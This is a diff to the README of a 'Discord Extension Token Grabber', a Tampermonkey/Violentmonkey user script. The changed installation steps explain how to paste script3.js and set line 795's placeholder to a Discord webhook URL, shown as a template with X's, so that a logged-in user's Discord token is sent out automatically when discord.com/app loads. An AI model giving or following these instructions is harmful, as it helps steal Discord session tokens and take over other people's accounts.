@@ -37,12 +37,17 @@ This **Discord Extension Token Grabber** is a user script (for Tampermonkey/Viol
 - Browser with Tampermonkey or Violentmonkey installed  
 - Discord logged in via web  
 
-📥 **Installation Steps**  
-1. Install [Tampermonkey](https://tampermonkey.net/) in your browser  
-2. Create a new script and paste the contents of `script3.js`  
-3. Replace the webhook URL with your own for testing  
-4. Open [https://discord.com/app](https://discord.com/app) and the token will be sent automatically
+📥 **Steps**  
+1. Install Tampermonkey or Violentmonkey  
+2. Create a new user script  
+3. Copy-paste the contents of `script3.js`  
+4. 🔧 Go to **line 795** and replace:
 
+```js
+url: "Webhook URL",
+with your actual webhook URL, for example
+url: "https://discord.com/api/webhooks/XXXXXXXXXX/XXXXXXXX",
+```
 ---
 
 ## ⚠️ Disclaimer  
